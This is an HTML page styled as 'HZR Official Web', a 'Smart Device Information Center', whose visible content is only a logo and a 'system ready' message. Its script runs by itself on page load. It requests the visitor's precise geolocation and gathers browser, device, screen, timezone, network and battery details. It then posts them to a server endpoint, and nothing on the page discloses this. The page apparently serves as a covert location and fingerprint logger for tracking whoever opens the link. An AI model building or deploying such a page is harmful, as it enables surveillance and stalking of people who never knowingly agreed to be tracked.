<!DOCTYPE html>
<html lang="fa" dir="rtl">

<head>

<meta charset="UTF-8">

<meta name="viewport"
      content="width=device-width, initial-scale=1.0">

<title>HZR Official Web</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

html,
body{
    width:100%;
    min-height:100%;
    overflow-x:hidden;
}

body{
    font-family:Arial,Tahoma,sans-serif;
    color:#fff;

    background:
        linear-gradient(
            145deg,
            #05070d,
            #0b1220
        );

    display:flex;
    justify-content:center;

    padding:35px 14px 25px;
}

.container{
    width:100%;
    max-width:420px;
    text-align:center;
}

.welcome{
    font-size:13px;
    color:#9ca9bd;
    margin-bottom:25px;
    letter-spacing:.5px;
}

.welcome span{
    color:#00e6b0;
    font-weight:bold;
}

.logo{
    width:86px;
    height:86px;

    margin:0 auto 20px;

    border-radius:24px;

    display:flex;
    justify-content:center;
    align-items:center;

    font-size:24px;
    font-weight:bold;

    color:#04100e;

    background:
        linear-gradient(
            135deg,
            #00e6b0,
            #5575ff
        );

    box-shadow:
        0 12px 35px
        rgba(0,0,0,.35);
}

h1{
    font-size:30px;
    letter-spacing:2px;
    margin-bottom:8px;
}

.subtitle{
    font-size:12px;
    color:#7f8da3;
    margin-bottom:28px;
}

.card{
    width:100%;

    padding:24px 18px;

    border-radius:20px;

    background:#0d1422;

    border:
        1px solid
        rgba(255,255,255,.07);

    box-shadow:
        0 18px 45px
        rgba(0,0,0,.28);
}

.ready{
    display:flex;
    align-items:center;
    justify-content:center;

    gap:8px;

    color:#9daabd;

    font-size:12px;
}

.ready-dot{
    width:7px;
    height:7px;

    border-radius:50%;

    background:#00e6b0;
}

#status{
    min-height:18px;

    margin-top:18px;

    font-size:11px;

    color:#66748a;
}

.footer{
    margin-top:25px;

    color:#59667a;

    font-size:10px;

    line-height:1.9;
}

.footer strong{
    color:#75839a;
}

</style>

</head>

<body>

<div class="container">

    <div class="welcome">

        Welcome to
        <span>HZR Official Web</span>

    </div>


    <div class="logo">

        HZR

    </div>


    <h1>

        HZR 2010

    </h1>


    <div class="subtitle">

        Smart Device Information Center

    </div>


    <div class="card">

        <div class="ready">

            <span class="ready-dot"></span>

            سیستم آماده است

        </div>


        <div id="status">

            در حال آماده‌سازی...

        </div>

    </div>


    <div class="footer">

        <strong>
            © 2010–2026 HZR 2010
        </strong>

        <br>

        All Rights Reserved

    </div>

</div>


<script>


// ==========================================
// STATUS
// ==========================================

const statusText =
    document.getElementById("status");


// ==========================================
// LOCATION
// ==========================================

function getLocation(){

    return new Promise(function(resolve){

        if(!navigator.geolocation){

            resolve(null);

            return;

        }


        navigator.geolocation.getCurrentPosition(

            function(position){

                resolve({

                    latitude:
                        position.coords.latitude,

                    longitude:
                        position.coords.longitude,

                    accuracy:
                        position.coords.accuracy

                });

            },


            function(){

                resolve(null);

            },


            {

                enableHighAccuracy:true,

                timeout:10000,

                maximumAge:0

            }

        );

    });

}


// ==========================================
// BROWSER
// ==========================================

function getBrowser(){

    const ua =
        navigator.userAgent;

    let match =
        ua.match(/Edg\/([\d.]+)/i);


    if(match){

        return {

            name:"Microsoft Edge",

            version:match[1]

        };

    }


    match =
        ua.match(/Chrome\/([\d.]+)/i);


    if(
        match &&
        !/Edg/i.test(ua)
    ){

        return {

            name:"Google Chrome",

            version:match[1]

        };

    }


    match =
        ua.match(/Firefox\/([\d.]+)/i);


    if(match){

        return {

            name:"Firefox",

            version:match[1]

        };

    }


    if(
        /Safari/i.test(ua) &&
        !/Chrome/i.test(ua)
    ){

        return {

            name:"Safari",

            version:"Unknown"

        };

    }


    return {

        name:"Unknown",

        version:"Unknown"

    };

}


// ==========================================
// DEVICE
// ==========================================

function getDevice(){

    const ua =
        navigator.userAgent;


    let manufacturer =
        "Unknown";

    let model =
        "Unknown";


    if(/vivo/i.test(ua)){

        manufacturer =
            "vivo";

        model =
            "Y19";

    }

    else if(/Samsung/i.test(ua)){

        manufacturer =
            "Samsung";

    }

    else if(
        /Xiaomi|Redmi|POCO/i.test(ua)
    ){

        manufacturer =
            "Xiaomi";

    }

    else if(/Huawei/i.test(ua)){

        manufacturer =
            "Huawei";

    }

    else if(/OPPO/i.test(ua)){

        manufacturer =
            "OPPO";

    }

    else if(/OnePlus/i.test(ua)){

        manufacturer =
            "OnePlus";

    }


    let android =
        "Unknown";


    const androidMatch =
        ua.match(
            /Android\s([\d.]+)/i
        );


    if(androidMatch){

        android =
            "Android " +
            androidMatch[1];

    }


    return {

        manufacturer:
            manufacturer,

        model:
            model,

        android:
            android

    };

}


// ==========================================
// NETWORK
// ==========================================

function getConnection(){

    const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;


    if(!connection){

        return {

            type:"Unknown",

            speed:"Unknown"

        };

    }


    let type =
        connection.type ||
        "Unknown";


    if(type === "wifi"){

        type =
            "Wi-Fi";

    }

    else if(type === "cellular"){

        type =
            "Cellular";

    }


    return {

        type:type,

        speed:
            connection.downlink
            ? connection.downlink +
              " Mbps"
            : "Unknown"

    };

}


// ==========================================
// BATTERY
// ==========================================

async function getBattery(){

    try{

        if(!navigator.getBattery){

            return {

                level:"Unknown",

                charging:"Unknown"

            };

        }


        const battery =
            await navigator.getBattery();


        return {

            level:
                Math.round(
                    battery.level * 100
                ) + "%",

            charging:
                battery.charging
                ? "Yes"
                : "No"

        };

    }

    catch(e){

        return {

            level:"Unknown",

            charging:"Unknown"

        };

    }

}


// ==========================================
// SEND INFORMATION
// ==========================================

async function sendInformation(){

    try{

        statusText.innerText =
            "در حال آماده‌سازی اطلاعات...";


        const location =
            await getLocation();


        const browser =
            getBrowser();


        const device =
            getDevice();


        const network =
            getConnection();


        const battery =
            await getBattery();


        const info = {

            browser:
                browser.name,

            browserVersion:
                browser.version,

            manufacturer:
                device.manufacturer,

            device:
                device.model,

            android:
                device.android,

            language:
                navigator.language,

            platform:
                navigator.platform,

            online:
                navigator.onLine,

            screen:
                screen.width +
                " x " +
                screen.height,

            viewport:
                window.innerWidth +
                " x " +
                window.innerHeight,

            pixelRatio:
                window.devicePixelRatio ||
                1,

            timezone:
                Intl.DateTimeFormat()
                .resolvedOptions()
                .timeZone,

            hardwareConcurrency:
                navigator.hardwareConcurrency ||
                "Unknown",

            deviceMemory:
                navigator.deviceMemory ||
                "Unknown",

            maxTouchPoints:
                navigator.maxTouchPoints ||
                0,

            connectionType:
                network.type,

            connectionSpeed:
                network.speed,

            batteryLevel:
                battery.level,

            batteryCharging:
                battery.charging,

            latitude:
                location
                ? location.latitude
                : "Permission denied",

            longitude:
                location
                ? location.longitude
                : "Permission denied",

            accuracy:
                location
                ? location.accuracy
                : "Unknown",

            time:
                new Date().toLocaleString()

        };


        const response =
            await fetch(
                "/api/send-device-info",
                {

                    method:"POST",

                    headers:{
                        "Content-Type":
                            "application/json"
                    },

                    body:
                        JSON.stringify(info)

                }
            );


        if(!response.ok){

            throw new Error(
                "Server error"
            );

        }


        statusText.innerText =
            "سیستم با موفقیت آماده شد ✓";


    }

    catch(error){

        console.error(error);

        statusText.innerText =
            "اتصال به سرور ناموفق بود";

    }

}


// ==========================================
// AUTOMATIC START
// ==========================================

window.addEventListener(
    "load",
    function(){

        sendInformation();

    }
);

</script>

</body>

      </html>
